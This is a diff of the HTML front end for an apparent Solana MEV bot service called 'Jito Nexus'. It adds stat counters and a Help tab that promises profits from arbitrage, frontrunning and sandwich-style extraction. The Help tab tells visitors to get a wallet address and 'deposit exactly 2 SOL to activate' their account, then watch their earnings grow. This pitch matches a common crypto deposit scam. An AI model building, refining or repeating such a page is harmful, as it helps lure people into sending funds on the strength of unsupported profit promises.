@@ -11,14 +11,29 @@
 <body>
     <div class="app-container">
         <nav>
-            <button onclick="showTab('today-stats')">Today's Stats</button>
+            <button onclick="showTab('global-nexus-stats')">Global Nexus Stats</button>
             <button onclick="showTab('my-wallet')">My Wallet</button>
             <button onclick="showTab('my-gains')">My Gains</button>
             <button onclick="showTab('nexus-wallet')">Nexus Wallet</button>
+            <button onclick="showTab('help')">Help</button>
         </nav>
         
-        <div id="today-stats" class="tab-content active">
-            <h2>Today's Stats</h2>
+        <div id="global-nexus-stats" class="tab-content active">
+            <h2>Global Nexus Stats</h2>
+            <div class="stats-container">
+                <div class="stat-item">
+                    <span class="stat-icon" style="background-color: #4CAF50;">👥</span>
+                    <p id="active-users">Active Users: <span>0</span></p>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-icon" style="background-color: #2196F3;">🔄</span>
+                    <p id="ongoing-mev">Ongoing MEV: <span>0</span></p>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-icon" style="background-color: #FF9800;">⚖️</span>
+                    <p id="ongoing-arbitrage">Ongoing Arbitrage: <span>0</span></p>
+                </div>
+            </div>
             <div id="sol-balance"></div>
             <div id="pooled-sol"></div>
             <div id="sandwich-attacks"></div>
@@ -53,6 +68,18 @@
         <div id="nexus-wallet" class="tab-content">
             <h2>Nexus Wallet</h2>
             <div id="transactions-list"></div>
+        </div>
+
+        <div id="help" class="tab-content">
+            <h2>How It Works</h2>
+            <p>Jito Nexus leverages advanced algorithms to exploit Maximal Extractable Value (MEV) opportunities on the Solana blockchain. Our system continuously scans for arbitrage, frontrunning, and backrunning possibilities to maximize your profits.</p>
+            <p>To join our profit machine and start earning:</p>
+            <ol>
+                <li>Obtain your unique wallet address</li>
+                <li>Deposit exactly 2 SOL to activate your account</li>
+                <li>Watch your earnings grow in real-time!</li>
+            </ol>
+            <button onclick="getWallet()">Get Wallet Address</button>
         </div>
     </div>
     <script src="script.js"></script>
